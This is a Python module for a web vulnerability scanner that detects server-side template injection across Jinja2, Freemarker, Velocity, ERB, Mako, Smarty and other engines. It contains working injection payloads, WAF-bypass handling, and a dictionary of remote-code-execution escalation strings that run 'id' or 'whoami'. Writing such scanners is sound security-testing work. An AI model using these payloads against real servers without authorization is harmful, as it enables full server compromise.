"""SSTI Scanner — Server-Side Template Injection detection.

Covers:
  - Jinja2 / Twig / Django (Python)
  - Freemarker / Velocity / Thymeleaf (Java)
  - Pebble / Jade / Pug
  - ERB / Slim (Ruby)
  - Razor (.NET)
  - Mustache / Handlebars
  - Smarty (PHP)
  - POST body injection
  - WAF bypass variants
  - RCE escalation POC in findings
"""
from __future__ import annotations
import asyncio
import html
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# Use unique large-number multiplication to avoid false positives
# "6375624792" won't appear naturally in prices, dates, IDs, etc.

SSTI_PAYLOADS = [
    # Jinja2 / Twig / Nunjucks
    ("{{79831*79832}}", "6375624792", "Jinja2/Twig/Nunjucks"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("{{config}}", "SECRET_KEY", "Jinja2 (config leak)"),
    ("{{self.__class__}}", "__class__", "Jinja2 (class access)"),

    # Freemarker
    ("${79831*79832}", "6375624792", "Freemarker/JSP-EL"),
    ("<#assign x=79831*79832>${x}", "6375624792", "Freemarker (assign)"),

    # Velocity
    ("#set($x=79831*79832)${x}", "6375624792", "Velocity"),
    ("$class.inspect('java.lang.Runtime')", "java.lang.Runtime", "Velocity (class access)"),

    # Thymeleaf (Spring)
    ("__${79831*79832}__", "6375624792", "Thymeleaf"),

    # ERB (Ruby)
    ("<%= 79831*79832 %>", "6375624792", "ERB (Ruby)"),
    ("<%= `id` %>", "uid=", "ERB (RCE)"),

    # Pebble
    ("{% set x = 79831*79832 %}{{x}}", "6375624792", "Pebble"),

    # Razor (.NET)
    ("@(79831*79832)", "6375624792", "Razor (.NET)"),

    # Mustache / Handlebars
    ("{{79831*79832}}", "6375624792", "Mustache/Handlebars"),

    # Smarty (PHP)
    ("{79831*79832}", "6375624792", "Smarty"),
    ("{php}echo 79831*79832;{/php}", "6375624792", "Smarty (PHP block)"),

    # Mako (Python)
    ("${79831*79832}", "6375624792", "Mako"),
    ("<%import os%>${os.popen('echo SSTI').read()}", "SSTI", "Mako (RCE)"),

    # Jade / Pug
    ("#{79831*79832}", "6375624792", "Jade/Pug"),

    # General expression
    ("{79831*79832}", "6375624792", "Generic expression"),

    # Bypass with whitespace/encoding
    ("{{ 79831 * 79832 }}", "6375624792", "Jinja2 (spaced)"),
    ("{%print(79831*79832)%}", "6375624792", "Jinja2 (print)"),
    ("${{79831*79832}}", "6375624792", "JSP-EL / Spring-EL"),
]

# RCE escalation payloads (for reporting, not active execution)
RCE_ESCALATION = {
    "Jinja2": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "Jinja2/Twig/Nunjucks": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "Freemarker": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    "Freemarker/JSP-EL": "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "Velocity": '#set($e="")#foreach($c in [1])$e.class.forName("java.lang.Runtime").getRuntime().exec("id")#end',
    "ERB (Ruby)": "<%= system('id') %>",
    "ERB (RCE)": "<%= `whoami` %>",
    "Smarty": "{system('id')}",
    "Smarty (PHP block)": "{php}system('id');{/php}",
    "Mako": "<%import subprocess%>${subprocess.check_output('id',shell=True)}",
    "Mako (RCE)": "<%import os%>${os.popen('whoami').read()}",
    "Pebble": '{% set cmd = "id" %}{% set runtime = beans.get("java.lang.Runtime") %}',
    "Razor (.NET)": "@{var p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";}",
    "Thymeleaf": "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
}

REMEDIATION = (
    "Never pass user input directly into template rendering. "
    "Use a sandboxed template environment. Use parameterized template variables "
    "instead of string interpolation. Consider using auto-escaping templates. "
    "Apply a strict allowlist for template syntax characters in user input."
)


class SSTIScanner(BaseScanner):
    name = "ssti"
    description = "Detects Server-Side Template Injection across 10+ template engines"
    tags = ["injection", "ssti", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        seen = set()

        tasks = []
        for url, params in state.target.discovered_params.items():
            for param in params:
                for payload, expected, engine in SSTI_PAYLOADS:
                    # GET injection
                    tasks.append(self._test(url, param, payload, expected, engine, "GET", "query"))
                # Also test POST body (common for forms)
                for payload, expected, engine in SSTI_PAYLOADS[:10]:
                    tasks.append(self._test(url, param, payload, expected, engine, "POST", "body"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test(self, url, param, payload, expected, engine,
                    method, inject_in) -> Optional[Finding]:
        # Baseline: check if the expected value already appears naturally
        baseline, _ = await self.test_payload(url, method, param, "harmless_value_12345", inject_in=inject_in)
        if baseline and expected in baseline.text:
            return None  # Canary present naturally → skip

        # Test with WAF bypass variants
        for variant in self.get_waf_bypass_variants(payload, "ssti"):
            resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
            if resp and expected in resp.text:
                # Reflection, including entity-escaped reflection, is the
                # negative control; it does not prove template evaluation.
                if variant in html.unescape(resp.text):
                    continue
                self.record_payload_result(variant, "ssti", success=True)

                rce_payload = RCE_ESCALATION.get(engine, "")
                is_rce = "RCE" in engine or "id" in expected or "uid=" in expected

                return self.make_finding(
                    title=f"SSTI ({engine}) in '{param}' — {'RCE confirmed' if is_rce else 'expression evaluated'}",
                    vuln_type="ssti_rce" if is_rce else "ssti",
                    severity=Severity.CRITICAL,
                    url=url, parameter=param, method=method, payload=variant,
                    evidence=f"Payload {variant!r} evaluated to {expected!r} (engine: {engine})",
                    request=raw_req, response=resp.text[:400],
                    cwe_id="CWE-94", owasp_category="A03:2021 - Injection",
                    description=(
                        f"Template engine ({engine}) evaluates user input in parameter '{param}' "
                        f"({method} {inject_in}). "
                        + ("Remote Code Execution confirmed." if is_rce else
                           "Escalatable to Remote Code Execution (RCE).")
                    ),
                    remediation=REMEDIATION,
                    poc_steps=[
                        f"1. {method} {url}?{param}={variant}" if method == "GET" else f"1. POST {url} with {param}={variant}",
                        f"2. Response contains '{expected}' — confirms {engine} template evaluation",
                        f"3. Escalate to RCE: {rce_payload}" if rce_payload else "3. Escalate using engine-specific RCE payloads",
                        "4. Impact: full server compromise, data exfiltration, lateral movement",
                    ],
                )
        return None
